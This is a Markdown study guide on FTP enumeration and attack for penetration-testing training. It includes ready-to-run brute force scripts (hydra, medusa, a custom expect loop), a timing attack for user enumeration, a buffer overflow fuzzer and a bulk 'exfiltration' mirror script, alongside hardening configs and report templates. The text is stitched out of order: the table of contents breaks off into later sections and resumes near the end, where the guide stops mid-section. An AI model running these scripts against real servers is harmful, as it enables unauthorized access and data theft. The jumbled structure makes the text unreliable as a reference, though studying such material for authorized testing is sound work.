# 🔧 FTP Enumeration - Complete Study Guide

> **File Transfer Protocol Security Assessment & Penetration Testing**

**Document Path:** `05-service-enumeration/ftp-complete-guide.md`  

---

## 📋 Table of Contents
1. [What is FTP Enumeration?](#what-is-ftp-enumeration)
2. [FTP Protocol Fundamentals](#ftp-protocol-fundamentals)
3. [Installation and Environment Setup](#installation-and-environment-setup)
4. **File Analysis**
   - Content of downloaded sensitive files
   - File type identification results
   - Grep output for password/credential searches

#### Command History Documentation
```bash
# Create comprehensive command log
script ftp-enumeration-session.log
# All commands executed during session will be logged

# Alternative: Manual command documentation
echo "=== FTP Enumeration Session $(date) ===" > ftp-commands.log
echo "nmap -p 21 -sV $TARGET" >> ftp-commands.log
echo "nmap --script ftp-anon -p 21 $TARGET" >> ftp-commands.log
# Continue logging all commands used
```

### Professional Report Template

#### Executive Summary Template
```markdown
## FTP Enumeration Assessment Report

### Executive Summary
**Target:** [IP Address/Hostname]
**Service:** FTP (File Transfer Protocol)
**Assessment Date:** [Date]
**Severity Level:** [High/Medium/Low]

**Key Findings:**
- FTP service identified running [Server Software Version]
- [Anonymous access allowed/denied]
- [X] directories accessible containing [Y] files
- [Sensitive information discovered/No sensitive data found]
- [Upload capability detected/No upload access]

**Risk Assessment:**
- **Information Disclosure:** [High/Medium/Low]
- **Unauthorized Access:** [High/Medium/Low] 
- **Data Exfiltration Potential:** [High/Medium/Low]
- **Malicious Upload Risk:** [High/Medium/Low]
```

#### Technical Details Section
```markdown
### Technical Assessment Details

#### Service Identification
**Command Executed:**
```bash
nmap -p 21 -sV 192.168.1.100
```

**Results:**
```
21/tcp open  ftp     vsftpd 3.0.3
```

**Analysis:**
- FTP service confirmed on standard port 21
- vsftpd version 3.0.3 identified
- [Version vulnerability research results if applicable]

#### Anonymous Access Testing
**Command Executed:**
```bash
nmap --script ftp-anon -p 21 192.168.1.100
```

**Results:**
```
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_List of files:
| drwxr-xr-x   2 ftp      ftp          4096 Nov 26 07:30 pub
| -rw-r--r--   1 ftp      ftp           234 Nov 26 07:25 readme.txt
```

**Analysis:**
- Anonymous access successfully established
- Public directory (/pub/) accessible
- readme.txt file available for analysis
- No authentication bypass required

#### Directory Structure Analysis
**Accessible Directories:**
- `/` (Root) - Read access
- `/pub/` - Read access, contains user data
- `/upload/` - Read/Write access (security risk)
- `/home/user/` - Restricted access

**File Inventory:**
- `readme.txt` (234 bytes) - Server information
- `userlist.txt` (1.2KB) - System user enumeration
- `config.backup` (4.5KB) - Configuration backup
- `database.sql.bak` (15MB) - Database backup file

#### Security Findings
**High Risk Issues:**
1. **Anonymous FTP Access Enabled**
   - Severity: High
   - Impact: Unauthorized access to sensitive data
   - Recommendation: Disable anonymous access, implement authentication

2. **Sensitive File Exposure**
   - Files: userlist.txt, database.sql.bak
   - Severity: High  
   - Impact: Information disclosure, user enumeration
   - Recommendation: Remove sensitive files, implement access controls

3. **Upload Directory Writable**
   - Location: /upload/
   - Severity: Medium
   - Impact: Potential malicious file upload
   - Recommendation: Restrict write permissions, implement upload validation

**Medium Risk Issues:**
1. **Directory Traversal Possible**
   - Impact: Access to system directories
   - Recommendation: Implement chroot jail, restrict navigation

2. **Plain Text Protocol**
   - Impact: Credential interception, data sniffing
   - Recommendation: Implement FTPS or SFTP
```

#### Penetration Testing Methodology
```markdown
### Methodology and Tools Used

#### Reconnaissance Phase
**Tools:** nmap, netcat
**Objective:** Service discovery and version identification
**Duration:** 5 minutes
**Success Criteria:** FTP service confirmed and version identified

#### Enumeration Phase  
**Tools:** nmap NSE scripts, ftp client, lftp
**Objective:** Access testing and content discovery
**Duration:** 20 minutes
**Success Criteria:** Access method identified, directory structure mapped

#### Analysis Phase
**Tools:** grep, strings, file command
**Objective:** Sensitive data identification and risk assessment
**Duration:** 15 minutes  
**Success Criteria:** Security implications documented

#### Total Assessment Time: 40 minutes
```

### Automated Report Generation

#### Report Generation Script
```bash
#!/bin/bash
# ftp-report-generator.sh

TARGET=$1
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
REPORT_FILE="ftp_assessment_${TARGET}_${TIMESTAMP}.md"

echo "# FTP Enumeration Report - $TARGET" > $REPORT_FILE
echo "Generated: $(date)" >> $REPORT_FILE
echo "" >> $REPORT_FILE

# Service Discovery Section
echo "## Service Discovery" >> $REPORT_FILE
echo '```bash' >> $REPORT_FILE
echo "nmap -p 21 -sV $TARGET" >> $REPORT_FILE
echo '```' >> $REPORT_FILE
nmap -p 21 -sV $TARGET >> $REPORT_FILE
echo "" >> $REPORT_FILE

# Anonymous Access Section
echo "## Anonymous Access Testing" >> $REPORT_FILE
echo '```bash' >> $REPORT_FILE
echo "nmap --script ftp-anon -p 21 $TARGET" >> $REPORT_FILE
echo '```' >> $REPORT_FILE
nmap --script ftp-anon -p 21 $TARGET >> $REPORT_FILE
echo "" >> $REPORT_FILE

# Manual Enumeration Section
echo "## Manual Enumeration Results" >> $REPORT_FILE
if timeout 30 expect << 'EOF'
spawn ftp $TARGET
expect "Name"
send "anonymous\r"
expect "Password:"  
send "anonymous\r"
expect {
    "230" { 
        send "pwd\r"
        expect "ftp>"
        send "ls -la\r"
        expect "ftp>"
        send "quit\r"
        exit 0
    }
    "530" { 
        send "quit\r"
        exit 1
    }
}
EOF
then
    echo "Anonymous access successful" >> $REPORT_FILE
else
    echo "Anonymous access failed" >> $REPORT_FILE
fi

echo "" >> $REPORT_FILE
echo "Report generated: $REPORT_FILE"
```

---

## 🎯 Advanced Techniques

### Advanced Enumeration Methods

#### FTP Protocol Analysis with Wireshark
```bash
# Capture FTP traffic for analysis
tcpdump -i eth0 -w ftp-capture.pcap host <target> and port 21

# Start Wireshark capture
wireshark -i eth0 -f "host <target> and port 21"

# Analyze captured FTP session
# Look for: Credentials in PASS commands, file transfers, server responses
```

#### FTP Service Fingerprinting
```bash
# Advanced service fingerprinting
nmap -p 21 --script ftp-syst,banner,ssl-cert <target>

# Custom banner analysis script
#!/bin/bash
# ftp-fingerprint.sh
TARGET=$1

echo "Connecting to FTP service for fingerprinting..."
timeout 10 nc -nv $TARGET 21 | tee ftp-banner.txt

# Analyze banner for version information
if grep -i "vsftpd" ftp-banner.txt; then
    echo "vsftpd server detected"
    # Check for vsftpd vulnerabilities
    searchsploit vsftpd
elif grep -i "proftpd" ftp-banner.txt; then
    echo "ProFTPD server detected"
    searchsploit proftpd
elif grep -i "filezilla" ftp-banner.txt; then
    echo "FileZilla server detected"
    searchsploit filezilla
fi
```

#### Custom FTP Client Scripting
```python
#!/usr/bin/env python3
# advanced-ftp-enum.py
import ftplib
import sys
import os

def ftp_connect(host, user='anonymous', passwd='anonymous'):
    try:
        ftp = ftplib.FTP()
        ftp.connect(host, 21)
        ftp.login(user, passwd)
        return ftp
    except ftplib.all_errors as e:
        print(f"Connection failed: {e}")
        return None

def recursive_list(ftp, path='.', max_depth=3, current_depth=0):
    if current_depth >= max_depth:
        return
    
    try:
        ftp.cwd(path)
        files = ftp.nlst()
        
        for file in files:
            try:
                # Try to enter as directory
                ftp.cwd(file)
                print(f"{'  ' * current_depth}[DIR] {path}/{file}")
                recursive_list(ftp, f"{path}/{file}", max_depth, current_depth + 1)
                ftp.cwd('..')
            except ftplib.error_perm:
                # It's a file
                print(f"{'  ' * current_depth}[FILE] {path}/{file}")
    except ftplib.all_errors as e:
        print(f"Error listing {path}: {e}")

def download_file(ftp, remote_file, local_file):
    try:
        with open(local_file, 'wb') as f:
            ftp.retrbinary(f'RETR {remote_file}', f.write)
        print(f"Downloaded: {remote_file} -> {local_file}")
        return True
    except ftplib.all_errors as e:
        print(f"Download failed: {e}")
        return False

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 advanced-ftp-enum.py <target>")
        sys.exit(1)
    
    target = sys.argv[1]
    print(f"Starting advanced FTP enumeration of {target}")
    
    # Test anonymous access
    ftp = ftp_connect(target)
    if not ftp:
        print("Anonymous access failed")
        return
    
    print("Anonymous access successful!")
    
    # Get system information
    try:
        system_info = ftp.sendcmd('SYST')
        print(f"System: {system_info}")
    except:
        pass
    
    # Recursive directory listing
    print("\n=== Directory Structure ===")
    recursive_list(ftp)
    
    # Download interesting files
    interesting_files = ['readme.txt', 'README', 'config.txt', '.htaccess', 'users.txt']
    print("\n=== Downloading Files ===")
    
    for file in interesting_files:
        download_file(ftp, file, f"downloaded_{file}")
    
    ftp.quit()
    print("Enumeration complete!")

if __name__ == "__main__":
    main()
```

### Advanced Attack Vectors

#### FTP Timing Attack for User Enumeration
```bash
#!/bin/bash
# ftp-timing-enum.sh
TARGET=$1
USERLIST=$2

echo "FTP Timing Attack User Enumeration"
echo "Target: $TARGET"

while IFS= read -r username; do
    echo -n "Testing user: $username ... "
    
    start_time=$(date +%s%N)
    timeout 10 expect << EOF > /dev/null 2>&1
    spawn ftp $TARGET
    expect "Name"
    send "$username\r"
    expect "Password:"
    send "wrongpassword\r"
    expect {
        "530" { send "quit\r" }
        "331" { send "quit\r" }
    }
EOF
    end_time=$(date +%s%N)
    
    duration=$((($end_time - $start_time) / 1000000))
    echo "${duration}ms"
    
    # Users that exist typically take longer to respond
    if [ $duration -gt 1000 ]; then
        echo "  [+] Potential valid user: $username (${duration}ms response)"
    fi
    
done < "$USERLIST"
```

#### FTP Buffer Overflow Testing
```python
#!/usr/bin/env python3
# ftp-buffer-test.py
import socket
import sys

def test_ftp_buffer(target, port=21):
    """Test FTP server for buffer overflow vulnerabilities"""
    
    test_cases = [
        ("USER", "A" * 1000),
        ("PASS", "A" * 1000), 
        ("CWD", "A" * 1000),
        ("STOR", "A" * 1000),
        ("RETR", "A" * 1000)
    ]
    
    for command, payload in test_cases:
        try:
            print(f"Testing {command} with {len(payload)} byte payload")
            
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((target, port))
            
            # Read banner
            banner = s.recv(1024)
            print(f"Banner: {banner.decode().strip()}")
            
            # Send malicious command
            malicious_cmd = f"{command} {payload}\r\n"
            s.send(malicious_cmd.encode())
            
            # Check response
            response = s.recv(1024)
            print(f"Response: {response.decode().strip()}")
            
            s.close()
            
        except Exception as e:
            print(f"Error testing {command}: {e}")
            # Server crash or connection issues might indicate vulnerability

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 ftp-buffer-test.py <target>")
        sys.exit(1)
    
    target = sys.argv[1]
    print(f"Testing FTP buffer overflow on {target}")
    test_ftp_buffer(target)

if __name__ == "__main__":
    main()
```

### Steganography and Covert Channels

#### Hidden Data in FTP Transfers
```bash
# Check for steganographic content in images
steghide info downloaded_image.jpg
steghide extract -sf downloaded_image.jpg

# Analyze file headers for hidden data
hexdump -C suspicious_file.txt | head -20
binwalk suspicious_file.txt

# Check for alternate data streams (Windows)
# Files downloaded from Windows FTP servers might have ADS
```

---

## 🛡️ Defense and Mitigation

### FTP Server Hardening Checklist

#### Authentication and Access Control
- [ ] **Disable anonymous access** unless specifically required
- [ ] **Implement strong password policies** for FTP accounts
- [ ] **Use certificate-based authentication** where possible
- [ ] **Enable account lockout** after failed login attempts
- [ ] **Implement IP-based access restrictions**
- [ ] **Use dedicated FTP user accounts** with minimal privileges

#### Encryption and Protocol Security
- [ ] **Deploy FTPS (FTP over SSL/TLS)** instead of plain FTP
- [ ] **Configure strong SSL/TLS ciphers** and disable weak algorithms
- [ ] **Implement SFTP (SSH File Transfer Protocol)** as alternative
- [ ] **Force encrypted connections** and reject plain text

#### Directory and File Permissions
- [ ] **Implement chroot jails** to restrict user access
- [ ] **Set proper file and directory permissions**
- [ ] **Separate upload and download directories**
- [ ] **Regular audit of accessible content**
- [ ] **Remove default and sample files**

#### Monitoring and Logging
- [ ] **Enable comprehensive FTP logging**
- [ ] **Monitor failed login attempts**
- [ ] **Log all file transfers and directory access**
- [ ] **Implement real-time alerting** for suspicious activities
- [ ] **Regular log analysis and review**

### Security Configuration Examples

#### vsftpd Secure Configuration
```bash
# /etc/vsftpd.conf - Secure configuration
anonymous_enable=NO
local_enable=YES
write_enable=YES
local_umask=022
dirmessage_enable=YES
use_localtime=YES
xferlog_enable=YES
connect_from_port_20=YES
chroot_local_user=YES
secure_chroot_dir=/var/run/vsftpd/empty
pam_service_name=vsftpd
ssl_enable=YES
ssl_tlsv1=YES
ssl_sslv2=NO
ssl_sslv3=NO
force_local_data_ssl=YES
force_local_logins_ssl=YES
ssl_ciphers=HIGH
rsa_cert_file=/etc/ssl/certs/vsftpd.crt
rsa_private_key_file=/etc/ssl/private/vsftpd.key
```

#### ProFTPD Secure Configuration
```bash
# /etc/proftpd/proftpd.conf - Security-focused
ServerName "Secure FTP Server"
ServerType standalone
DefaultServer on
Port 0
User proftpd
Group nogroup

# Security directives
RootLogin off
RequireValidShell off
DefaultRoot ~ !adm
AllowOverwrite on
<Anonymous ~ftp>
  User ftp
  Group nogroup
  UserAlias anonymous ftp
  DirFakeUser on ftp
  DirFakeGroup on ftp
  RequireValidShell off
  MaxClients 10
  DisplayLogin welcome.msg
  DisplayChdir .message
</Anonymous>

# SSL/TLS Configuration
<IfModule mod_tls.c>
  TLSEngine on
  TLSLog /var/log/proftpd/tls.log
  TLSProtocol TLSv1.2 TLSv1.3
  TLSRequired on
  TLSRSACertificateFile /etc/ssl/certs/proftpd.crt
  TLSRSACertificateKeyFile /etc/ssl/private/proftpd.key
  TLSVerifyClient off
</IfModule>
```

---

## 📚 Additional Resources and References

### Official Documentation
- **RFC 959 - File Transfer Protocol (FTP)**: https://tools.ietf.org/html/rfc959
- **RFC 2228 - FTP Security Extensions**: https://tools.ietf.org/html/rfc2228
- **RFC 4217 - Securing FTP with TLS**: https://tools.ietf.org/html/rfc4217

### FTP Server Documentation
- **vsftpd**: https://security.appspot.com/vsftpd.html
- **ProFTPD**: http://www.proftpd.org/docs/
- **Pure-FTPd**: https://www.pureftpd.org/project/pure-ftpd/doc
- **IIS FTP**: https://docs.microsoft.com/en-us/iis/publish/using-the-ftp-service/

### Security Resources
- **OWASP FTP Security**: https://owasp.org/www-community/vulnerabilities/
- **NIST Cybersecurity Framework**: https://www.nist.gov/cyberframework
- **CIS Controls for FTP**: https://www.cisecurity.org/controls/

### Penetration Testing Resources
- **HackTricks FTP**: https://book.hacktricks.xyz/pentesting/pentesting-ftp
- **PayloadsAllTheThings**: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/FTP
- **SecLists**: https://github.com/danielmiessler/SecLists

### Vulnerability Databases
- **CVE Details FTP**: https://www.cvedetails.com/product/3590/Vsftpd-Vsftpd.html
- **Exploit Database**: https://www.exploit-db.com/search?q=ftp
- **SecurityFocus**: http://www.securityfocus.com/bid/

### Training and Certification
- **eLearnSecurity eJPT**: Focus on practical FTP enumeration skills
- **OSCP**: Advanced FTP exploitation techniques
- **CEH**: Comprehensive FTP security assessment
- **CISSP**: FTP security architecture and controls

---

## 🎯 Quick Reference Cheat Sheet

### Essential Commands
```bash
# Service Discovery
nmap -p 21 -sV <target>                    # Basic service detection
nmap -p 21,990,2121 -sV -sC <target>      # Comprehensive FTP scan

# Anonymous Access Testing  
nmap --script ftp-anon -p 21 <target>     # NSE anonymous test
ftp <target>                              # Manual connection

# Directory Enumeration
ftp> pwd                                  # Current directory
ftp> ls -la                               # Detailed listing
ftp> cd <directory>                       # Navigate

# File Operations
ftp> binary                               # Set binary mode
ftp> get <filename>                       # Download file
ftp> put <filename>                       # Upload file
ftp> mget *.txt                           # Download multiple files

# Brute Force
hydra -l admin -P passwords.txt ftp://<target>
```

### Common FTP Ports
- **21/tcp** - Standard FTP control
- **20/tcp** - FTP data (active mode)
- **990/tcp** - FTPS (FTP over SSL)
- **2121/tcp** - Alternative FTP port

### Anonymous Credentials to Try
- anonymous:anonymous
- anonymous:[blank]
- anonymous:user@domain.com
- ftp:ftp
- guest:guest

### Critical Directories to Check
- `/pub/` - Public files
- `/home/` - User directories
- `/etc/` - Configuration files
- `/var/log/` - Log files
- `/tmp/` - Temporary files
- `/upload/` - Upload directory

---

**Study Tip:** Practice these techniques in a controlled lab environment before attempting any real-world assessments. Always ensure you have proper authorization before testing FTP services.

**Last Updated:** November 2024
**Version:** 2.0 - Enhanced Study Edition [Reconnaissance Phase](#reconnaissance-phase)
5. [Enumeration Techniques](#enumeration-techniques)
6. [Attack Vectors and Exploitation](#attack-vectors-and-exploitation)
7. [Advanced Techniques](#advanced-techniques)
8. [eJPT Exam Focus](#ejpt-exam-focus)
9. [Common Issues & Troubleshooting](#common-issues--troubleshooting)
10. [Real-World Scenarios](#real-world-scenarios)
11. [Documentation and Reporting](#documentation-and-reporting)

---

## 🎯 What is FTP Enumeration?

### Definition
FTP enumeration is a critical phase in penetration testing that involves systematically analyzing File Transfer Protocol services to discover:
- **Service versions and configurations**
- **Anonymous access opportunities**
- **Directory structures and accessible files**
- **User accounts and authentication mechanisms**
- **Upload/download capabilities**
- **Security vulnerabilities and misconfigurations**

### Why FTP Enumeration Matters
- **High-value target**: FTP servers often contain sensitive data, configuration files, and user information
- **Common misconfigurations**: Many FTP servers allow anonymous access or have weak permissions
- **Attack surface**: FTP can be a gateway to internal networks and systems
- **Information disclosure**: Directory listings can reveal system information and user data

### Attack Surface Overview
```
FTP Service (Port 21/tcp)
├── Anonymous Access Testing
├── Directory Structure Enumeration  
├── File Discovery and Analysis
├── Permission Testing (Read/Write)
├── User Account Discovery
├── Version Fingerprinting
└── Advanced Attack Vectors
    ├── FTP Bounce Attacks
    ├── Brute Force Authentication
    └── Binary/ASCII Transfer Exploitation
```

---

## 📚 FTP Protocol Fundamentals

### FTP Architecture
**Control Connection (Port 21):**
- Handles commands and responses
- Persistent connection throughout session
- Plain text communication (unless FTPS)

**Data Connection:**
- **Active Mode**: Server initiates connection to client (Port 20 → Client)
- **Passive Mode**: Client initiates connection to server (Client → Server random port)

### FTP Commands Essential for Enumeration
| Command | Function | Security Relevance |
|---------|----------|-------------------|
| `USER` | Specify username | Anonymous access testing |
| `PASS` | Specify password | Brute force attacks |
| `SYST` | System information | OS fingerprinting |
| `LIST` | Detailed directory listing | File/directory enumeration |
| `NLST` | Name-only listing | Quick directory scanning |
| `PWD` | Print working directory | Navigation and mapping |
| `CWD` | Change working directory | Directory traversal |
| `RETR` | Retrieve (download) file | Data exfiltration |
| `STOR` | Store (upload) file | Malicious file upload |
| `HELP` | List available commands | Server capability discovery |

### FTP Response Codes
| Code Range | Meaning | Examples |
|------------|---------|----------|
| 1xx | Preliminary positive | 150 File status okay |
| 2xx | Completion positive | 230 User logged in, 226 Transfer complete |
| 3xx | Intermediate positive | 331 Username okay, need password |
| 4xx | Transient negative | 425 Can't open data connection |
| 5xx | Permanent negative | 530 Not logged in, 550 File unavailable |

---

## 📦 Installation and Environment Setup

### Prerequisites Checklist
- [ ] Linux-based system (Kali Linux recommended)
- [ ] Network connectivity to target
- [ ] Root/administrative privileges for tool installation
- [ ] Wordlists for brute force attacks

### Core Tools Installation
```bash
# Update package repository
sudo apt update && sudo apt upgrade -y

# Install FTP client tools
sudo apt install -y ftp lftp ncftp

# Install enumeration and attack tools
sudo apt install -y nmap hydra medusa

# Install wordlists (if not present)
sudo apt install -y wordlists
# Location: /usr/share/wordlists/

# Verify installations
ftp --version
lftp --version  
nmap --version
hydra -h
```

### Environment Configuration
```bash
# Create working directory structure
mkdir -p ~/ftp-enumeration/{tools,wordlists,results,scripts}
cd ~/ftp-enumeration

# Download additional wordlists
wget https://github.com/danielmiessler/SecLists/raw/master/Usernames/top-usernames-shortlist.txt -O wordlists/users.txt
wget https://github.com/danielmiessler/SecLists/raw/master/Passwords/Common-Credentials/10k-most-common.txt -O wordlists/passwords.txt

# Set up custom wordlists for FTP
echo -e "admin\nroot\nuser\nftp\nguest\nanonymous" > wordlists/ftp-users.txt
echo -e "admin\npassword\n123456\nroot\nftp\nanonymous" > wordlists/ftp-passwords.txt
```

### NSE Scripts Verification
```bash
# List all FTP-related NSE scripts
ls -la /usr/share/nmap/scripts/ftp*

# Expected scripts:
# ftp-anon.nse      - Anonymous FTP access detection
# ftp-bounce.nse    - FTP bounce attack testing
# ftp-brute.nse     - FTP brute force authentication
# ftp-libopie.nse   - OPIE authentication testing
# ftp-proftpd-backdoor.nse - ProFTPD backdoor detection  
# ftp-syst.nse      - System information extraction
# ftp-vsftpd-backdoor.nse  - vsftpd backdoor detection

# Test NSE script functionality
nmap --script-help ftp-anon
```

---

## 🔍 Reconnaissance Phase

### Step 1: Port Discovery and Service Detection

#### Basic Port Scanning
```bash
# Quick FTP port discovery
nmap -p 21 -sV <target>

# Comprehensive FTP port scanning
nmap -p 21,20,990,2121,8021 -sV -sC <target>

# Example output interpretation:
# 21/tcp   open  ftp     vsftpd 3.0.3
# 990/tcp  open  ftps-data?  
# 2121/tcp open  ccproxy-ftp?
```

#### Advanced Service Detection
```bash
# Aggressive service detection with scripts
nmap -p 21 -sV -A --script ftp-* <target>

# Version detection with vulnerability scanning
nmap -p 21 -sV --script vulners <target>

# Example comprehensive scan
nmap -p 21,990,2121 -sV -sC --script ftp-anon,ftp-syst,ftp-vsftpd-backdoor <target>
```

### Step 2: Service Banner Analysis

#### Manual Banner Grabbing
```bash
# Netcat banner grabbing
nc -nv <target> 21

# Telnet banner grabbing  
telnet <target> 21

# Expected banner examples:
# 220 (vsFTPd 3.0.3)
# 220 ProFTPD 1.3.5 Server ready
# 220 Microsoft FTP Service
```

#### Nmap Service Detection
```bash
# Detailed service version detection
nmap -p 21 -sV --version-intensity 9 <target>

# Service fingerprinting with NSE
nmap -p 21 --script ftp-syst,banner <target>
```

---

## 🧪 Enumeration Techniques

### Phase 1: Anonymous Access Testing

#### NSE Script Method (Recommended)
```bash
# Primary anonymous access detection
nmap --script ftp-anon -p 21 <target>

# Expected positive output:
# | ftp-anon: Anonymous FTP login allowed (FTP code 230)
# |_List of files:
# | drwxr-xr-x   2 ftp      ftp          4096 Nov 26 07:30 pub
# | -rw-r--r--   1 ftp      ftp           234 Nov 26 07:25 readme.txt
```

#### Manual Anonymous Testing
```bash
# Method 1: Standard anonymous login
ftp <target>
# Username: anonymous
# Password: anonymous

# Method 2: Email-based anonymous login  
ftp <target>
# Username: anonymous  
# Password: user@example.com

# Method 3: Blank password anonymous login
ftp <target>
# Username: anonymous
# Password: [Press Enter - blank password]

# Method 4: Alternative anonymous accounts
# Username: ftp, Password: ftp
# Username: guest, Password: guest  
# Username: test, Password: test
```

#### Automated Anonymous Testing Script
```bash
#!/bin/bash
# anonymous-ftp-test.sh
TARGET=$1

echo "Testing anonymous FTP access on $TARGET"

# Common anonymous credential combinations
declare -a USERS=("anonymous" "ftp" "guest")
declare -a PASSWORDS=("" "anonymous" "ftp" "guest" "test@example.com")

for user in "${USERS[@]}"; do
    for pass in "${PASSWORDS[@]}"; do
        echo "Trying $user:$pass"
        timeout 10 expect << EOF
        spawn ftp $TARGET
        expect "Name"
        send "$user\r"
        expect "Password:"
        send "$pass\r"
        expect {
            "230" { 
                puts "SUCCESS: $user:$pass"
                send "quit\r"
                exit 0
            }
            "530" { 
                puts "FAILED: $user:$pass"
                send "quit\r"
            }
        }
EOF
    done
done
```

### Phase 2: Directory Structure Enumeration

#### Basic Directory Listing
```bash
# After successful FTP login
ftp> pwd
# Output: 257 "/" is the current directory

# Detailed directory listing
ftp> ls -la
ftp> dir -la

# Expected output format:
# drwxr-xr-x   2 owner    group        4096 Nov 26 07:30 directory_name
# -rw-r--r--   1 owner    group         234 Nov 26 07:25 file_name.txt
#
# Permission bits explanation:
# d = directory, - = file
# rwx = read/write/execute permissions (owner/group/others)
```

#### Comprehensive Directory Mapping
```bash
# Navigation and enumeration
ftp> pwd                    # Current directory
ftp> ls -la                 # Detailed listing
ftp> ls -R                  # Recursive listing (if allowed)

# Common directories to check
ftp> cd pub                 # Public directory
ftp> cd home                # User home directories
ftp> cd var                 # Variable data directory
ftp> cd etc                 # Configuration directory
ftp> cd tmp                 # Temporary directory
ftp> cd upload              # Upload directory
ftp> cd download            # Download directory

# Directory traversal attempts
ftp> cd ..                  # Parent directory
ftp> cd ../../../           # Multiple level traversal
```

#### Advanced Directory Discovery
```bash
# Using lftp for better enumeration
lftp ftp://anonymous:anonymous@<target>
lftp> find .                # Find all files and directories
lftp> du -a                 # Disk usage with all files
lftp> mirror --dry-run .    # Simulate full download to see structure

# Using ncftp for enhanced navigation
ncftp -u anonymous -p anonymous <target>
ncftp> rls -la              # Recursive listing
ncftp> rls -R               # Full recursive structure
```

### Phase 3: File Discovery and Analysis

#### File Enumeration Strategies
```bash
# Look for interesting file types
ftp> ls -la *.txt           # Text files
ftp> ls -la *.conf          # Configuration files  
ftp> ls -la *.cfg           # Configuration files
ftp> ls -la *.ini           # Initialization files
ftp> ls -la *.log           # Log files
ftp> ls -la *.bak           # Backup files
ftp> ls -la *.sql           # Database files
ftp> ls -la *.xml           # XML configuration files
ftp> ls -la *.properties    # Java properties files

# Search for hidden files
ftp> ls -la .*              # Hidden files (starting with .)
ftp> ls -la .htaccess       # Web server configuration
ftp> ls -la .htpasswd       # Web authentication file
```

#### File Download and Analysis
```bash
# Set appropriate transfer mode
ftp> binary                 # For binary files (executables, images, etc.)
ftp> ascii                  # For text files (default)

# Download files for analysis
ftp> get filename           # Download single file
ftp> mget *.txt             # Download multiple files matching pattern
ftp> prompt off             # Disable interactive prompting for mget
ftp> mget *                 # Download all files in directory

# Download with lftp (more reliable)
lftp> mget -c *.txt         # Resume interrupted transfers
lftp> mirror directory/     # Download entire directory structure
```

#### File Content Analysis
```bash
# After downloading files locally
cat downloaded_file.txt              # View text file content
strings binary_file                  # Extract strings from binary files
file downloaded_file                 # Determine file type
head -20 large_file.log             # View first 20 lines
tail -20 large_file.log             # View last 20 lines
grep -i "password\|user\|admin" *   # Search for sensitive information
```

### Phase 4: Permission Testing

#### Read Permission Testing
```bash
# Test read access to different directories
ftp> cd /etc
ftp> ls -la                 # Can we read system configuration?

ftp> cd /home
ftp> ls -la                 # Can we read user directories?

ftp> cd /var/log  
ftp> ls -la                 # Can we read log files?
```

#### Write Permission Testing
```bash
# Create test file locally first
echo "FTP write test" > test_upload.txt

# Test upload capabilities
ftp> put test_upload.txt
# Possible responses:
# 226 Transfer complete (success)
# 550 Permission denied (no write access)
# 553 Could not create file (directory protection)

# Test in different directories
ftp> cd /tmp
ftp> put test_upload.txt

ftp> cd /upload
ftp> put test_upload.txt

ftp> cd /pub
ftp> put test_upload.txt

# Verify upload success
ftp> ls -la test_upload.txt
```

#### Advanced Permission Testing
```bash
# Test directory creation
ftp> mkdir test_directory
# 257 Directory created (success)
# 550 Permission denied (no create permission)

# Test file deletion
ftp> delete test_upload.txt
# 250 File deleted (success)
# 550 Permission denied (no delete permission)

# Test file renaming  
ftp> rename old_name.txt new_name.txt
# 250 Rename successful (success)
# 550 Permission denied (no rename permission)
```

---

## ⚔️ Attack Vectors and Exploitation

### Attack Vector 1: Anonymous Access Exploitation

#### Information Disclosure
```bash
# After gaining anonymous access
# 1. Map entire directory structure
ftp> ls -R > directory_structure.txt

# 2. Download configuration files
ftp> cd /etc
ftp> mget *.conf
ftp> mget *.cfg

# 3. Download user data
ftp> cd /home
ftp> ls -la
ftp> cd username
ftp> mget *

# 4. Download log files for information gathering
ftp> cd /var/log
ftp> mget *.log
```

#### Data Exfiltration Strategy
```bash
# Systematic data collection
#!/bin/bash
# ftp-exfiltration.sh
TARGET=$1
LOCAL_DIR="ftp-exfil-$(date +%Y%m%d-%H%M%S)"
mkdir $LOCAL_DIR
cd $LOCAL_DIR

# Connect and download systematically
lftp ftp://anonymous:anonymous@$TARGET << EOF
set ftp:list-options -la
mirror --verbose --parallel=3 .
bye
EOF

# Analyze downloaded content
find . -name "*.txt" -exec grep -l "password\|user\|admin\|key" {} \;
find . -name "*.conf" -exec cat {} \;
find . -name "*.log" -exec tail -50 {} \;
```

### Attack Vector 2: Brute Force Authentication

#### Hydra-based Brute Force
```bash
# Single username brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<target>

# Username list brute force  
hydra -L userlist.txt -P passwordlist.txt ftp://<target>

# Common FTP credentials brute force
hydra -L ftp-users.txt -P ftp-passwords.txt -t 4 ftp://<target>

# Advanced hydra options
hydra -L users.txt -P passwords.txt -t 16 -f -V ftp://<target>
# -t 16: 16 parallel threads
# -f: Stop after first successful login
# -V: Verbose output
```

#### Medusa-based Brute Force
```bash
# Medusa alternative approach
medusa -h <target> -u admin -P passwords.txt -M ftp
medusa -h <target> -U users.txt -P passwords.txt -M ftp -t 10

# Medusa with combo file (username:password format)
medusa -h <target> -C combo.txt -M ftp
```

#### Custom Brute Force Script
```bash
#!/bin/bash
# ftp-brute.sh
TARGET=$1
USERLIST=$2
PASSLIST=$3

echo "Starting FTP brute force against $TARGET"

while IFS= read -r user; do
    while IFS= read -r pass; do
        echo "Trying $user:$pass"
        timeout 10 expect << EOF
        spawn ftp $TARGET
        expect "Name"
        send "$user\r"
        expect "Password:"
        send "$pass\r"
        expect {
            "230" {
                puts "SUCCESS: $user:$pass"
                send "quit\r"
                exit 0
            }
            "530" {
                send "quit\r"
            }
        }
EOF
    done < "$PASSLIST"
done < "$USERLIST"
```

### Attack Vector 3: FTP Bounce Attacks

#### Understanding FTP Bounce
FTP bounce attacks exploit the FTP PORT command to:
- Scan internal networks from FTP server
- Bypass firewall restrictions
- Attack services through FTP server as proxy

#### FTP Bounce Detection
```bash
# Nmap FTP bounce detection
nmap --script ftp-bounce -p 21 <target>

# Manual bounce testing
ftp <target>
ftp> PORT 192,168,1,1,0,22    # Try to connect to 192.168.1.1:22
# If successful: 200 PORT command successful
# If blocked: 425 Can't build data connection
```

#### FTP Bounce Exploitation
```bash
# Using nmap through FTP bounce
